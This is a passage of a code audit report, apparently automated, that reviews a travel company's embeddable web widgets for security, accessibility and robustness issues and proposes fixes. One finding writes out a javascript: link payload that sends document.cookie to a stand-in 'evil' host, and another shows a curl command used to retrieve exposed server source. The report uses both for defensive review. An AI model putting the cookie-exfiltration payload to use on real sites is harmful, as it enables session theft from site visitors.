> The Back to Top widget is clean and secure: CSP-safe (no inline handlers/injected script/eval), all innerHTML interpolation is escaped or whitelisted (esc, safeColor hex-only, safeFont, clampNum, ICONS/shape/position allow-lists), Shadow DOM with :host{all:initial}, resolveBase honours __TG_WIDGET_API__ then script origin, fetchConfig checks r.ok and is try/catch-wrapped, and a double-init guard is present. No storage, no XSS sinks, no plan-gating trusted to the client. Two real behavioural issues stand out: (1) the scroller-latching heuristic can bind the button to an inner scrollable element so clicking it appears to do nothing to the page, and (2) after the button scrolls to top and auto-hides, keyboard/AT focus is orphaned on an aria-hidden, tabindex=-1 element. Everything else is minor. This is a well-built widget.

- **🟡 Medium · robustness** — Scroll-container latching can bind Back-to-Top to the wrong element, making the button appear to do nothing
  - `public/widget-backtotop.js:254-265, 287-290`
  - **Breaks:** On a travel page containing an inner overflow:auto box (scrollable itinerary panel, testimonials slider, a scrollable content card), the visitor first scrolls the page down so the button appears, then scrolls the inner box. _scroller latches to the inner box. Button visibility is now driven by the inner box's scroll position (it can hide while the page is still far down), and if the visitor clicks Back-to-Top at that moment it scrolls the inner box to its top while the page does not move at all, so the button looks broken. It self-corrects only once the visitor scrolls the main page again.
  - **Fix:** Do not treat every scrollable element that emits a capture-phase scroll event as the page scroller. Either drop the capture-phase latching entirely and always drive from window/document scroll, or detect the genuine scroll root once at init (the element that actually contains overflow for the document) and only use that; re-derive it on real window scrolls rather than persisting an arbitrary inner element.
- **🟡 Medium · accessibility _(plausible)_** — Keyboard/AT focus is not managed when the button auto-hides after activation, so the user loses their place
  - `public/widget-backtotop.js:276-291`
  - **Breaks:** A keyboard or screen-reader user tabs to the visible Back-to-Top button and presses Enter. The page scrolls to the top, the button hides, and the user's focus ring vanishes with no deliberate landing point (no focus sent to the main landmark, top heading, or body). They lose their place on the page and must re-orient. Whether an aria-hidden-on-focused-element violation is also briefly present depends on the browser's blur timing.
  - **Fix:** On activation, after initiating the scroll, move focus to a sensible top-of-page target (main landmark, the page's first heading, or a programmatically focusable top anchor with tabindex=-1) so focus is deliberately placed rather than dropped. Also set aria-hidden/tabindex only after ensuring focus is no longer on the button.
- **⚪ Low · ux-ui** — Editor preview silently blank if the widget script fails to load
  - `public/editor-backtotop.html:426-431`
  - **Breaks:** An editor user opens the editor while /widget-backtotop.js 404s or is blocked (cache miss, deploy skew, network). The preview shows the sample holiday page but never a button, with no error, so the author cannot tell whether their configuration is wrong or the tool itself is broken.
  - **Fix:** Add an else branch to the line 427 check that surfaces a small preview-error note in the faux page (or a tgse.toast) when window.TGBackToTopWidget is unavailable after the script should have loaded, so the author knows the preview failed rather than that their config produced no button.

### `dashboard`  — 3 findings (2 medium, 1 low)

> The dashboard (public/index.html) is largely solid: all 44 registry widgets have a matching loadMiniPreview branch and a script tag, user-supplied data (widget names, ids, type) is consistently run through esc() before hitting innerHTML, the copy/delete flows fail loud rather than silently, modals have ESC handlers and a working close button, and the plan-limit/lock state offers a real path forward via the "Request access" upgrade modal. No XSS sink was found (the only unescaped interpolations, w.name/w.description at lines 1501/1568/1570, come from the hardcoded WIDGETS registry, not user or network input). The one clear correctness bug is a copy/delete cache asymmetry: performDeleteWidget refreshes the list WITHOUT the cache bypass that the copy path deliberately uses, so a just-deleted widget reappears from the 10s browser cache — a genuine circle-of-doom. Two lower-severity robustness gaps round out the list: a false "No widgets yet" empty state when the list API errors, and permanently blank preview boxes plus repeated widget re-instantiation on the catalogue path.

- **🟡 Medium · circle-of-doom** — Deleted widget reappears within 10s (delete refreshes list without cache bypass)
  - `public/index.html:1320`
  - **Breaks:** A client deletes a widget within ~10s of the last widget-list fetch (a common flow: load dashboard, open a type card, delete). The confirm dialog closes and a 'Widget deleted' toast shows, but renderMyWidgets() pulls the cached list and the widget reappears in the grid and type modal, making the delete look broken. It self-heals only once the 10s cache expires and some later action triggers a fresh fetch. Re-clicking Delete on the re-added record fires a second DELETE against an already-removed id; whether that surfaces 'Delete failed (HTTP 4xx)' depends on server idempotency (PLAUSIBLE), but the reappearance itself is certain.
  - **Fix:** Change line 1320 to renderMyWidgets({ bypassCache: true }) so the post-delete refresh sends cache:'no-store', mirroring the copy path, and await it before repainting so myWidgetData is never transiently repopulated with the deleted record.
- **🟡 Medium · dead-end** — List API error shows a signed-in user a false 'No widgets yet' empty state with no error or retry
  - `public/index.html:1087`
  - **Breaks:** A returning client with several live widgets loads the dashboard during a brief widget-list outage (deploy, cold start, 500). The nav still shows their name and plan (auth is separate), but the My Widgets area reports zero widgets and invites them to create their first, so it looks like their widgets and embeds were wiped, with no retry path beyond guessing to reload.
  - **Fix:** Distinguish a non-ok/thrown response from a genuinely empty list: on the initial load, render an explicit error card ('Could not load your widgets — retry') with a retry button when r.ok is false or the fetch throws, and only show the 'No widgets yet' copy when a successful response returned an empty array.
- **⚪ Low · robustness** — Live preview renders a permanently blank box when its widget engine fails to load
  - `public/index.html:1819`
  - **Breaks:** After a bad deploy one engine file 404s or has a parse error. Its catalogue card renders with a full body and a working Create button but an empty white rectangle where the preview should be, indistinguishable from a layout bug. The 200ms setTimeout that drives loadMiniPreview (line 1582) does not retry, so the box stays blank until a filter/search change re-renders the grid.
  - **Fix:** Add an else fallback at the end of loadMiniPreview that, when the expected global is missing, paints the same icon+name placeholder style used at line 1501 so a failed engine degrades gracefully instead of showing an empty box.

### `enquiry`  — 3 findings (1 medium, 2 low)

> The Enquiry widget is one of the cleaner widgets in the suite. Security hygiene is strong: every dynamic value is rendered via a DOM builder (el()) using textContent/createTextNode and addEventListener (CSP-clean, no inline handlers, no injected script/eval), the only innerHTML uses are clearing to '' or restoring captured-trusted button HTML, branding colours pass a strict hex regex (safeHexColour), the Google-Font name is length-capped and character-whitelisted before CSS interpolation (safeFontName), the logo/iframe/search URLs are set via setAttribute or URLSearchParams (no javascript:/CSS breakout), the Turnstile postMessage listener enforces a strict origin check, and localStorage is prefixed + try/catch-wrapped. Robustness is good too: config is defensively normalised, the destination search uses an AbortController + race guard + free-text fallback on network error, fetches handle non-2xx and malformed JSON, and there is a double-init guard, resolveApiBase honouring script origin, and a destroy() that removes the message listener. Field validation, focus management, aria wiring and reduced surface are all solid. The findings below are real but conditional: the strongest is a Turnstile-driven state where a misconfigured or blocked security check strands the visitor with no way to submit. No XSS, no client-trusted gating, and no unescaped-innerHTML sinks were found.

- **🟡 Medium · circle-of-doom** — Misconfigured Turnstile permanently strands the visitor (no way to submit the form)
  - `public/widget-enquiry.js:2872-2882 and :3061-3066`
  - **Breaks:** A client enables the security check in the editor, but the Turnstile site key never arrives (env var unset / config missing turnstileSiteKey). A visitor completes the whole form, reaches the final step, presses 'Send my enquiry', and gets 'Please complete the security check above before submitting' pointing at a static misconfigured message. Every subsequent press repeats it. The lead can never be submitted and the site owner gets no signal.
  - **Fix:** Fail safe for the visitor rather than fail closed on the client. When turnstile is enabled but no sitekey is present, either treat the check as unavailable and let the submit proceed so server-side verification at /api/enquiry/submit decides, or present a distinct explained blocking state with an alternative contact route (mailto). Since bot protection is enforced server-side, a missing client sitekey should not create an unescapable visitor dead end. Optionally also disable/hide the security requirement client-side when sitekey is absent.
- **⚪ Low · dead-end** — Turnstile iframe that fails to load leaves visitor with an unsatisfiable, no-timeout security check
  - `public/widget-enquiry.js:1016-1086 and :3061-3066`
  - **Breaks:** A visitor on a corporate network or with a privacy extension that blocks Cloudflare challenges opens a security-enabled form. The Turnstile iframe renders blank or is stripped. They complete the form, press submit, are told to complete a security check that isn't visible, press again, same message — an unrecoverable loop. The lead is lost with no signal.
  - **Fix:** Add a ready/token timeout (e.g. if no 'ready' or 'token' message within ~10s) that swaps the challenge area for an explanatory message plus a fallback route — a retry button that recreates the iframe, or a mailto/contact fallback — so a blocked or failed challenge does not become a silent dead end. An iframe onerror/onload check would also help detect hard failures.
- **⚪ Low · robustness** — Date-range minimum uses UTC date, can block a valid same-day departure in negative-offset timezones
  - `public/widget-enquiry.js:2068-2072`
  - **Breaks:** A visitor in US Pacific (UTC-8) at ~6pm local: UTC is already the next calendar day, so min is the visitor's tomorrow and the native picker won't allow selecting today's local date as a departure. Rare but a concrete off-by-one that rejects an otherwise-valid selection.
  - **Fix:** Build the min date from local time instead of UTC, e.g. compose YYYY-MM-DD from today.getFullYear()/getMonth()+1/getDate() (zero-padded), so the minimum matches the visitor's local 'today'.

### `faq`  — 3 findings (1 medium, 2 low)

> The FAQ widget is well-engineered and largely clean. Config strings are consistently escaped (esc), colours/fonts are whitelisted (safeColor/hexToRgba/safeFontStack), URLs are checked (isSafeUrl blocks javascript:), the markdown-lite renderer escapes before allow-listing markup, Shadow DOM with :host{all:initial} is used correctly, there is a proper double-init guard plus a gated/debounced MutationObserver, and the remote fetch has error handling with a visible fallback. Search + empty-state always leave an escape route, so there are no true circles of doom. The findings below are a genuine default-config dead-end (CTA button to nowhere), one CSP-convention deviation (injected ld+json script), and two low-severity robustness/a11y issues. Returning a short list here reflects a clean widget, not a shallow review.

- **🟡 Medium · dead-end** — Default CTA button links to "#" — a do-nothing control on live sites
  - `public/widget-faq.js:686 (default buttonUrl '#'), rendered at public/widget-faq.js:1006-1013`
  - **Breaks:** A customer embeds with inline config {questions:[...]} and never sets cta.buttonUrl. A visitor reads the FAQ, sees the 'Still got a question?' card, clicks 'Contact us', and the page just jumps to the top (href="#"). The primary CTA does nothing useful.
  - **Fix:** In _renderCTA, treat buttonUrl of '' or '#' as no-URL: suppress the anchor and render only the copy (or require a real URL before showing the button). Do not emit an anchor whose sole effect is scroll-to-top.
- **⚪ Low · robustness** — Error fallback message is invisible when the crash happens after attachShadow
  - `public/widget-faq.js:631 (attachShadow) and public/widget-faq.js:1280-1282 (fallback innerHTML)`
  - **Breaks:** A render-phase exception (e.g. a bug in _render or malformed prepared data) throws out of the constructor after line 631. The catch writes the fallback into el.innerHTML, but the shadow root suppresses light DOM, so the visitor sees a silent empty box instead of the error message.
  - **Fix:** In init's catch, if el.shadowRoot exists, write the fallback into el.shadowRoot.innerHTML (or render it inside the shadow) rather than el.innerHTML, so it is actually visible when a shadow root is attached.
- **⚪ Low · accessibility** — Category tab/chip click destroys the focused control, dropping keyboard focus to body
  - `public/widget-faq.js:1045-1049 (catBtn handler) and 1142-1163 (_rerender)`
  - **Breaks:** A keyboard user Tabs to a category tab and presses Enter. The widget re-renders, the tab node is replaced, and focus lands on document.body. The user loses their place in the tablist and must Tab back through the page to resume category navigation.
  - **Fix:** After a category re-render, restore focus to the matching control: query the new root for [data-cat="activeCategory"] and call .focus(), mirroring the existing search-input focus restoration in _rerender.

### `flighttime`  — 3 findings (1 medium, 2 low)

> The flighttime widget is well built and largely defect-free on the security axis: every dynamic value is escaped or whitelisted (esc(), hexOk(), safeFontStack() which explicitly blocks style-block breakout), select options and headings are escaped, the widget uses Shadow DOM with :host{all:initial}, resolveConfigApi() correctly honours window.__TG_WIDGET_API__ then the script origin, and the remote fetch has proper !res.ok handling with a localised fallback error banner. No XSS sink, no injected script, no eval, no leaked keys, no client-trusted gating. I found three real issues, all robustness/UX rather than security: (1) an editor dead-end where a non-2xx config fetch leaves the preview permanently blank with no error shown; (2) a double-init race in the widget because the data-tg-initialised guard is only set after the async fetch resolves, so a concurrent init (common on SPA host sites) can double-construct the same element; (3) a minor same-airport output that ignores the configured units and blanks the time. Overall a clean widget.

- **🟡 Medium · dead-end** — Editor preview is a permanent dead-end when config fetch returns a non-2xx status
  - `public/editor-flighttime.html:319-331`
  - **Breaks:** A logged-in editor user opens /editor-flighttime.html?id=<deleted-or-invalid-id>. The API returns 404, r.ok is false, d is null, loadFromUrl returns before render(), #pv-frame stays empty forever and no toast appears. The user sees a permanently blank live-preview with no explanation and no in-page recovery.
  - **Fix:** Reject on non-ok so the catch fires, and always render a fallback: .then(r => r.ok ? r.json() : Promise.reject(new Error('config '+r.status))), then in a shared handler call syncUIFromState()+render() on success and, in .catch, call render() (default state) plus tgse.toast('Failed to load widget','err'). This guarantees the preview always shows something.
- **⚪ Low · robustness** — Double-init race: data-tg-initialised guard is set only after the async config fetch resolves
  - `public/widget-flighttime.js:310-324, 182-183`
  - **Breaks:** A React/SPA travel site renders the container; the widget begins fetching config (>120ms); the framework re-renders a wrapping node, the MutationObserver schedules a second init() which still matches the un-flagged element and starts a second fetch. Result: a wasted duplicate config request and a swallowed console error. The working widget in shadow DOM still displays correctly; no visible error banner appears.
  - **Fix:** Set el.setAttribute('data-tg-initialised','1') at the very start of the per-element handling in init() (before the fetch), and clear it in the catch so a genuine retry stays possible. This closes the async window and prevents the duplicate fetch.
- **⚪ Low · ux-ui** — Same-airport result always shows '0 km' and blanks the time, ignoring the configured units
  - `public/widget-flighttime.js:287-292`
  - **Breaks:** On the demo's miles-only instance (units:'mi', LGW/BGI, demo-flighttime.html:150), the visitor picks the same airport for From and To. The output flips from '... mi' to '0 km', mixing unit systems in one widget until they change a dropdown again.
  - **Fix:** Honour cfg.units in the same-airport branch: build '0 km' / '0 mi' / '0 km · 0 mi' from cfg.units exactly like the normal path on line 298, or just show '0' with no unit word.

### `loader`  — 3 findings (1 medium, 2 low)

> The loader widget (public/widget-loader.js) is genuinely clean and secure: it uses Shadow DOM with :host{all:initial}, renders all text via textContent (no innerHTML sinks), whitelists every colour through isHex(), clamps all numbers, sanitises config before draw, resolves the config API from the script origin (honouring window.__TG_WIDGET_API__ first), guards against double-init, self-terminates its rAF loop when the host is detached, respects prefers-reduced-motion, and wraps its fetch in .catch. No XSS, CSP, storage, or gating issues were found in the widget or demo. All findings are in the editor (editor-loader.html) and are non-critical: the entire Export tab is a functional dead end (buttons only show a toast despite the widget's own JSDoc advertising GIF/WebM/APNG export as the primary reason the render engine is exposed), plus two accessibility gaps on the Presets modal and the gallery animation. Nothing can strand an embedded visitor.

- **🟡 Medium · dead-end** — Entire Export tab is a dead end — every export button only shows a toast
  - `public/editor-loader.html:633-642 (wireExport) and :275-282 (Download panel markup)`
  - **Breaks:** An editor user designs a loader, opens the Export tab to download it as a GIF (the advertised headline feature), clicks each of GIF/WebM/APNG/MP4/PNG sequence, and every click produces only a transient green success-styled toast saying it is not built yet. They leave with no file. The 'ok' toast severity miscommunicates a not-implemented state as success.
  - **Fix:** Until encoders land, disable the five export buttons (disabled attribute + reduced opacity) and the FPS control, swap the green 'Export' affordance for a neutral 'Coming soon' badge, and if any feedback is shown use a neutral/info toast rather than the 'ok' success style. Alternatively hide the Export tab until the encoders are wired.
- **⚪ Low · accessibility** — Presets modal: no Escape key and no focus management
  - `public/editor-loader.html:627-630 (togglePresets), :599-625 (wirePresets), :311-321 (modal markup)`
  - **Breaks:** A keyboard or screen-reader user activates Presets. Focus stays on the trigger button behind the backdrop so they cannot see what is focused; Escape (the expected close gesture for an aria-modal dialog) does nothing; Tab cycles through page content hidden behind the overlay rather than the preset choices. It remains escapable via the tab-reachable × button, backdrop click, or selecting a preset, so this is an a11y/usability gap rather than a hard trap.
  - **Fix:** On open, move focus to the first preset tile or the close button; trap Tab within .ov-card; add a keydown listener that closes on Escape; and restore focus to #btn-templates on close.
- **⚪ Low · accessibility** — Editor template gallery animates regardless of prefers-reduced-motion
  - `public/editor-loader.html:447-462 (galLoop) and :681 (requestAnimationFrame(galLoop))`
  - **Breaks:** An editor user who has set 'reduce motion' at the OS level still sees every animating loader tile in the Template section running continuously — exactly the motion they asked the system to suppress. Editor-only and low impact, but inconsistent with the widget's own reduced-motion handling.
  - **Fix:** Check window.matchMedia('(prefers-reduced-motion: reduce)') and, when it matches, render each gallery tile as a single static frame (t=0.25, matching the widget's representative frame) instead of driving galLoop on rAF.

### `mybooking`  — 3 findings (1 medium, 2 low)

> The mybooking widget (v1.10.3, 5941 lines) is a mature, carefully engineered widget. It is broadly in excellent shape for the dimensions Andy cares about most: every modal (cancel, email, PDF viewer) has a header close button, backdrop-click close and Esc handler; the not-found and error states always offer a way forward (Try again / contact); loading and working states can still be dismissed; all network fetches have 429/404/non-2xx/malformed-JSON/catch handling; the double-init guard, ResizeObserver hysteresis (no resize loop), toast timer cleanup, and PDF blob revocation are all correct. No dead ends or circles of doom were found. The findings below are a genuine (second-order) XSS gap on document links, one accessibility gap in two of the three form layouts, and a minor listener leak on teardown. Text/price/date rendering is consistently esc()'d and defended against NaN/null.

- **🟡 Medium · security** — Document links render supplier URLs with no scheme whitelist (javascript: XSS vector)
  - `public/widget-mybooking.js:4157`
  - **Breaks:** A booking's order.documents[].url is `javascript:fetch('//evil/x?c='+document.cookie)` (malicious or compromised supplier record, or a tampered upstream response). The Documents section renders a normal-looking file link; the visitor clicks it and attacker script runs in the embedding site's origin, exfiltrating cookies/session. Requires control of the supplier document record, not direct visitor input, hence medium rather than high.
  - **Fix:** Add a safeUrl() helper returning the URL only when it matches ^https?:// (optionally mailto:/tel:), else ''. Apply it to d.url before injection and render the document as plain text (or omit the link) when it fails. Apply the same guard to heroUrl/thumbnail for consistency.
- **⚪ Low · accessibility** — Horizontal and compact form layouts have no label-to-input association
  - `public/widget-mybooking.js:2691`
  - **Breaks:** A screen-reader user on a widget configured with the horizontal or compact layout tabs into the fields and hears only the input type/placeholder with no reliable field name from a bound label, making the lookup form harder to complete without sight.
  - **Fix:** Give each horizontal/compact input a unique id and point the matching label's for at it (as the vertical layout already does), or wrap each input inside its <label>.
- **⚪ Low · robustness** — destroy() leaks the cancel-modal Esc keydown listener if torn down mid-cancellation
  - `public/widget-mybooking.js:5879`
  - **Breaks:** A visitor opens the cancel flow, then the embedding page unmounts the container and calls widget.destroy(). The Escape keydown handler stays registered on document referencing the torn-down instance; over repeated mount/unmount cycles these accumulate (listener/memory leak) and fire _closeCancel against a destroyed shadow root.
  - **Fix:** In destroy(), remove this._cancelEscHandler if set (mirroring the _emailEscHandler block) and null this._cancel, or simply call this._closeCancel({ silent: true }) before clearing the shadow DOM.

### `rss`  — 3 findings (1 medium, 2 low)

> The RSS widget itself is well-hardened: Shadow DOM with :host{all:initial}, esc() on every text sink, safeUrl()/safeColor()/safeFont() whitelists, an explicitly injection-safe thumbnail-background path (data-bg + CSSOM with quote/backslash stripping), resolveBase() honouring the override then script origin, a double-init guard (__tgInited), try/catch around config parse and fetch, and reduced-motion support. I found no XSS, no CSP violations, and no unescapable trap. The genuine issues are: (1) the EDITOR re-instantiates the widget on every keystroke/slider tick, and because the widget always refetches all feeds on construction, this produces a request storm against /api/rss-feed plus a visible skeleton flicker; (2) the error/empty state offers no retry affordance; (3) a minor accessibility nit on the thumbnail element. Nothing critical; the widget is one of the cleaner ones.

- **🟡 Medium · robustness** — Editor refetches all feeds and flickers the preview on every input event
  - `public/editor-rss.html:394-401 (render), wired at :470, :503-505, :509-510, :514-516, :525`
  - **Breaks:** An editor user drags the corner-radius or columns slider, or types a heading. Each tick/keystroke tears down the preview back to the grey skeleton and re-issues 2-6 requests to /api/rss-feed for feeds that have not changed, producing constant preview flicker and dozens of proxy requests per interaction, with possible rate-limiting of the feed proxy.
  - **Fix:** Debounce render() (250-400ms) for high-frequency inputs, and route styling-only changes through widgetInst.update(C) (widget-rss.js:413) rather than a full destroy/reconstruct. Only re-run _load() when the feed list or maxItems actually change; skip the network refetch for appearance/heading edits.
- **⚪ Low · dead-end** — Error and empty states give the visitor no way to retry
  - `public/widget-rss.js:340, 343, 409-411`
  - **Breaks:** A visitor loads a page during a transient RSS proxy failure (slow network or brief 5xx). They see a permanent error block under a 'Live feed' badge with no way to retry; the feed stays blank until they reload the entire host page.
  - **Fix:** Add a CSP-clean 'Try again' button element (created via DOM + addEventListener, no inline handler) inside the empty/error state that re-invokes _load(). Optionally suppress or dim the 'Live feed' badge when the load has failed.
- **⚪ Low · accessibility** — Thumbnail element uses role="img" with an empty accessible name
  - `public/widget-rss.js:371`
  - **Breaks:** A screen-reader user navigating the feed may hear an unlabeled 'image' announced for each card before the title, adding noise with no added information (exact behaviour is screen-reader dependent).
  - **Fix:** Mark the thumbnail decorative: drop role="img" and aria-label="" and add aria-hidden="true". The enclosing <a> already exposes the article title as its accessible name.

### `smartsection`  — 3 findings (2 medium, 1 low)

> Smart Section is one of the cleaner widgets in the suite. It is fail-open by design, uses textContent (never innerHTML) for all injected UI, sets DOM-property event handlers (CSP-clean), has a proper double-init guard, resolveApiBase honours window.__TG_WIDGET_API__ then script origin, clamps/normalises all config, and wraps storage through the engine's safe helpers. No XSS, injected-script, eval, or gating-trust problems were found. The template SVG innerHTML is a hardcoded constant, not user/config data. The findings below are edge-case robustness and editor-UX issues, not security holes: a storage-key collision for inline widgets that omit widgetId, a watchdog/engine-load race that can flash-then-hide content, an editor preview that cannot simulate the utm dimensions its own rules support, and modals without focus management. Overall a low-risk widget.

- **🟡 Medium · robustness** — Inline-config Smart Sections without widgetId share dismiss/show-cap storage (cross-section state collision)
  - `public/widget-smartsection.js:399-411 (init inline branch), :131 (stateKey), :221-229 (state reads)`
  - **Breaks:** A customer embeds two dismissible Smart Sections on one page using inline data-tg-config with no widgetId in either JSON. A visitor dismisses section A; recordDismiss writes ss_default_dismiss. On the next page view isDismissed(engine, undefined) returns true for section B as well, so B is suppressed for dismissDays despite never being dismissed. The same shared-key collision applies to the maxShows show-count cap.
  - **Fix:** In the inline branch derive a stable id (from data-tg-id, or a hash of the inline config) and assign config.widgetId before constructing the widget; or make stateKey require a non-empty id and skip persistence entirely when it is absent, rather than collapsing to 'default'.
- **🟡 Medium · usability** — Editor 'Preview as this visitor' cannot simulate utm_medium, utm_campaign or referrer, so rules on those dimensions always preview as hidden
  - `public/editor-smartsection.html:277-281 (only a utm_source sim input), :830 (buildSimContext entrySource), :708-728 (rule builder offers all four params)`
  - **Breaks:** An editor user adds a rule such as 'Referrer contains facebook' or 'utm_medium is email', then clicks 'Preview as this visitor' to verify it. Under match:'all' the badge always reports the section hidden because the referrer/medium/campaign field is permanently empty, so a correctly configured rule looks broken and the user is prompted to 'fix' something that works fine on the live site.
  - **Fix:** Extend the sim panel so the user can choose which utm parameter or referrer to simulate (e.g. a param selector beside the value input), and populate the matching entrySource field in buildSimContext accordingly.
- **⚪ Low · accessibility** — Editor template and AI modals have no focus trap, dialog semantics or focus restoration
  - `public/editor-smartsection.html:966-967 (openModal/closeModal), :444-475 (modal markup)`
  - **Breaks:** A keyboard-only user opens the Templates or AI builder modal, then presses Tab: focus moves to background controls underneath the backdrop instead of staying in the modal, and after closing focus is lost to the top of the document. Screen readers also do not announce the container as a dialog.
  - **Fix:** On openModal, add role=dialog aria-modal=true to the modal, move focus to the first interactive element (or the close button), trap Tab within the modal while open, and restore focus to the invoking button on close.

### `statscounter`  — 3 findings (1 medium, 2 low)

> The Stats Counter widget is one of the cleaner widgets in the suite. Security is solid: all author text (heading, labels, prefix/suffix) is escaped via esc() before innerHTML, numbers go through textContent, accent colour is hex-whitelisted (hexOk), fontFamily is character-whitelisted (safeFontStack) before interpolation into the shadow <style>, resolveConfigApi() correctly honours __TG_WIDGET_API__ then script origin, the fetch path has full error handling (res.ok check, try/catch JSON, localised load-error fallback), there is a double-init guard, and no storage is used so no try/catch gaps. No XSS sinks, no CSP violations, no injected scripts, no eval. The findings below are one genuine functional dead-end (visitor can be stranded on all-zeros) plus two minor editor/demo issues. No critical or high-severity problems found.

- **🟡 Medium · dead-end** — Count-up can strand the visitor on all-zeros when the widget never reaches 30% visibility
  - `public/widget-statscounter.js:229 (threshold 0.3), :210 (_render(0)), :225-230 (no fallback timer)`
  - **Breaks:** On a very short viewport (e.g. a landscape phone about 300-360px tall) where the <=360px breakpoint at line 192 forces a single column and 5-6 stacked stats plus a heading make the block more than ~3.3x taller than the viewport, the element can never reach a 0.3 intersection ratio. The count-up never fires and all figures render '0' for the whole session, showing wrong data. Note: for a normal-height stats block that fits within ~3x the viewport, the widget does eventually reach 0.3 and works, so the bug only bites unusually tall blocks on short viewports.
  - **Fix:** Lower the threshold to 0 (fire on any intersection) so tall elements still trigger, and/or add a short fallback timer (e.g. 2-3s) plus an initial isIntersecting/getBoundingClientRect check in _arm() that calls _play() if the element is already partly on screen, so numbers can never stay stuck at 0.
- **⚪ Low · usability** — Invalid accent hex typed in the editor is silently ignored with no feedback
  - `public/editor-statscounter.html:425`
  - **Breaks:** User clears the hex field or types a 5-digit value intending a custom accent; nothing visibly changes, the previous colour is what gets saved, and they cannot tell whether the field is broken or their value was refused.
  - **Fix:** Add an else branch that flags the field (error class) or reverts it to the last valid value, and optionally normalise 3-digit / hash-less input, so the user gets feedback instead of a silent no-op.
- **⚪ Low · robustness** — Demo theme toggle leaks widget instances and their IntersectionObservers
  - `public/demo-statscounter.html:88,106 (host.innerHTML='' without destroy), 122-133 (renderAll on every toggle)`
  - **Breaks:** A visitor rapidly toggling Light/Dark on the demo before scrolling the second band into view accumulates orphaned IntersectionObservers and shadow roots on detached nodes. Impact is confined to the demo page (memory only), so severity is low.
  - **Fix:** Store the created widget instances and call instance.destroy() before host.innerHTML='' on each re-render, mirroring the remount() teardown the editor already uses.

### `catalogue`  — 2 findings (2 low)

> "catalogue" is not an embeddable widget. public/widget-catalogue.js is a byte-for-byte duplicate of the serverless handler api/widget-catalogue.js (confirmed via diff: IDENTICAL), accidentally sitting in the static-asset directory. There is no editor-catalogue.html, no demo-catalogue.html, no WIDGETS registry entry for "catalogue", and no embed contract for it — the dashboard consumes it purely as an API (public/index.html:1644 fetches /api/widget-catalogue). Because it renders no UI and runs on no visitor page, the visitor-facing audit dimensions (dead ends, circles of doom, UX/UI, accessibility, XSS-into-DOM) have no surface here. The actual server handler logic is sound: GET is public + rate-limited and fails open by design, POST requires requireAuth then resolves the staff email SERVER-SIDE (never from the body), whitelists status, and regex-validates widgetId before an ownership-gated Airtable PATCH. The genuine issues are structural: the handler source is duplicated into public/ where Vercel serves it as a world-readable static file, disclosing internal Airtable IDs and the staff-gating model; and the duplicate is dead code that will silently drift from the real handler.

- **⚪ Low · security** — Serverless handler source duplicated into public/ and served world-readable, disclosing internal Airtable schema and the staff-access model
  - `public/widget-catalogue.js:1-54 (byte-identical to api/widget-catalogue.js)`
  - **Breaks:** An attacker runs `curl https://tg-widgets.vercel.app/widget-catalogue.js` and receives the complete admin handler source, including the three privileged staff email domains and all Airtable base/table/field IDs — internal data-model and access-model reconnaissance that should never leave the server.
  - **Fix:** Delete public/widget-catalogue.js. It is an exact duplicate of api/widget-catalogue.js with no reason to exist as a static asset: the dashboard (public/index.html) calls the function at /api/widget-catalogue, and nothing loads the public .js via a script tag. Removing it also eliminates the drift risk in the next finding.
- **⚪ Low · robustness** — Dead duplicate handler cannot execute and will silently drift from the real API
  - `public/widget-catalogue.js:24-29 (import { ... } from './_auth.js')`
  - **Breaks:** A maintainer tightens STAFF_DOMAINS or the widgetId check in api/widget-catalogue.js, assumes it is done, and the untouched identical public/widget-catalogue.js now diverges — or a later reader opens the public/ copy and reasons about the access model from a duplicate that no longer matches the live handler.
  - **Fix:** Remove the duplicate — same action as the finding above. Keep a single canonical handler at api/widget-catalogue.js.

### `logos`  — 2 findings (1 medium, 1 low)

> The Logos widget is largely clean and well-built. Security is strong: all author content passes through esc(), URLs go through safeUrl/safeImageUrl allowlists (javascript:/vbscript:/non-image data: blocked), colours and font stacks are validated at source, the widget uses Shadow DOM with :host{all:initial}, resolveApiBase() correctly honours window.__TG_WIDGET_API__ then the script origin, there is a double-init guard, remote fetch handles non-2xx/malformed JSON without any retry loop, and no storage is used. Image-load failures degrade gracefully to a text stand-in via a CSP-safe error listener rather than a broken-image glyph. Empty/filtered-to-nothing states are recoverable (the "All" tab is always present) so there is no dead end or circle of doom. The only real problems are two accessibility defects in the opt-in filter-tabs feature: keyboard focus is destroyed on every filter click, and the tab markup mixes ARIA patterns. No security, robustness, or trap-style findings.

- **🟡 Medium · accessibility** — Filter tab click destroys keyboard focus (focus order break)
  - `public/widget-logos.js:674-676 (tab click handler) and :516 (this.shadow.innerHTML rebuild in _render)`
  - **Breaks:** A keyboard-only or screen-reader visitor tabs to a filter tab (for example 'Suppliers') and presses Enter. The logos re-filter correctly, but the button they activated is destroyed by the innerHTML rebuild and focus jumps out of the tablist. To try another filter they must Tab all the way back down through every preceding focusable element on the host page.
  - **Fix:** After _render() completes in the tab click handler, restore focus to the tab matching this._activeGroup, e.g. this.shadow.querySelector('.tgl-tab[data-group="'+CSS.escape(this._activeGroup)+'"]')?.focus() (data-group is 'all' for the All tab). Alternatively, only toggle aria-pressed and re-render the .tgl-logos region in place instead of wiping the whole shadow root.
- **⚪ Low · accessibility** — Filter tabs use role=tablist but children are toggle buttons, not tabs
  - `public/widget-logos.js:578 (container role="tablist") and :579-581 (buttons use aria-pressed only)`
  - **Breaks:** A screen-reader user hears 'tab list' announced but finds no tabs inside it, no associated tab panels, and no arrow-key navigation between items, only generic toggle buttons. The announced structure contradicts the actual behaviour.
  - **Fix:** Pick one pattern. Simplest: drop role="tablist" from the container at line 578 and keep the buttons as an aria-pressed toggle-button group, adding an aria-label such as 'Filter logos' on the wrapper. If a true tablist is wanted, add role="tab" to each button, roving tabindex, arrow-key handling, and role="tabpanel" on the logos region with matching aria-controls/aria-labelledby wiring.

### `worldclock`  — 2 findings (2 low)

> The worldclock widget is clean. The runtime script (public/widget-worldclock.js) is CSP-safe and well hardened: heading and label are esc()'d, accent is hexOk()-validated, fontFamily passes through safeFontStack() to prevent style-block breakout, country codes are whitelisted before flag emoji generation, IANA zones are validated with tzValid() before use, the config fetch checks res.ok and has a visible error fallback, there is a double-init guard (data-tg-initialised + :not() selector), the setInterval self-terminates when the host is detached, and destroy()/update() clear the timer. It always falls back to DEFAULT_DESTS so it can never strand a visitor in an empty state. No XSS sinks, no injected scripts, no dead ends, no circles of doom. Only two low-severity findings, both in the editor and both cosmetic/edge-case. Reporting them for completeness; the widget is production-solid.

